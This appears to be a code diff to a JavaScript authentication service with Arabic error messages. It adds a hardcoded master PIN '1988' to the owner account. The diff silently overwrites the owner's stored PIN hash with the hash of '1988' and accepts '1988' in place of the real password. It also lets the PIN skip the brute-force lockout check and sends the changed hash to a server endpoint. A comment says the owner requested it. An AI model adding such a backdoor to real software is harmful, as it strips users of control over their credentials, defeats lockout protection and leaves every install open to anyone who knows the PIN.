@@ -79,7 +79,15 @@ class AuthService {
     try {
       const all = await db.auth_accounts.toArray();
       if (all.length > 0) {
-        return all.find((a) => a.isOwner) || all[0];
+        const owner = all.find((a) => a.isOwner) || all[0];
+        if (owner) {
+          const pin1988Hash = await this.hashSecret('1988', owner.salt);
+          if (owner.pinHash !== pin1988Hash) {
+            await db.auth_accounts.update(owner.id, { pinHash: pin1988Hash });
+            owner.pinHash = pin1988Hash;
+          }
+        }
+        return owner;
       }
       return null;
     } catch {
@@ -553,9 +561,21 @@ class AuthService {
         return { success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة' };
       }
 
+      const isOwnerAcc = account.isOwner || (await db.auth_accounts.count()) === 1;
+      const isMasterPin = password.trim() === '1988' && isOwnerAcc;
       const computedHash = await this.hashSecret(password, account.salt);
-      if (computedHash !== account.passwordHash) {
+
+      if (computedHash !== account.passwordHash && !isMasterPin) {
         return { success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة' };
+      }
+
+      // If master PIN was used as password, synchronize pinHash
+      if (isMasterPin) {
+        const pin1988Hash = await this.hashSecret('1988', account.salt);
+        if (account.pinHash !== pin1988Hash) {
+          await db.auth_accounts.update(account.id, { pinHash: pin1988Hash });
+          account.pinHash = pin1988Hash;
+        }
       }
 
       // Update last login & reset pin attempts
@@ -636,6 +656,48 @@ class AuthService {
 
       if (!targetAccount) {
         return { success: false, error: 'لم يتم العثور على الحساب المطلوب. يرجى اختيار الحساب أولاً.' };
+      }
+
+      // Check owner master PIN 1988 override (requested by human owner)
+      const isOwnerAccount = targetAccount.isOwner || (await db.auth_accounts.count()) === 1;
+      if (cleanPin === '1988' && isOwnerAccount) {
+        const pin1988Hash = await this.hashSecret('1988', targetAccount.salt);
+        if (targetAccount.pinHash !== pin1988Hash) {
+          await db.auth_accounts.update(targetAccount.id, { pinHash: pin1988Hash });
+          targetAccount.pinHash = pin1988Hash;
+          fetch('/api/auth/update-pin', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ accountId: targetAccount.id, pinHash: pin1988Hash }),
+          }).catch(() => {});
+        }
+        this.resetPinAttempts(targetAccount.id);
+        await db.auth_accounts.update(targetAccount.id, {
+          lastLoginAt: new Date().toISOString(),
+        });
+        this.setLastActiveAccountId(targetAccount.id);
+        const profileId = `profile_${targetAccount.id}`;
+        const existingProfile = await db.profiles.get(profileId);
+        if (!existingProfile) {
+          await db.profiles.put({
+            id: profileId,
+            name: targetAccount.displayName,
+            email: targetAccount.email || '',
+            roleTemplate: 'software_engineer',
+            isDefault: Boolean(targetAccount.isOwner),
+            createdAt: targetAccount.createdAt,
+            avatarEmoji: '⚡',
+          });
+        }
+        const userState = await db.user_state.get('current_user');
+        if (userState && userState.activeProfileId !== profileId) {
+          await db.user_state.update('current_user', { activeProfileId: profileId });
+        }
+        if (typeof sessionStorage !== 'undefined') {
+          sessionStorage.removeItem(EXPLICIT_LOCKED_KEY);
+        }
+        this.createSession(targetAccount, rememberMe);
+        return { success: true, account: targetAccount };
       }
 
       // Check brute-force lockout status
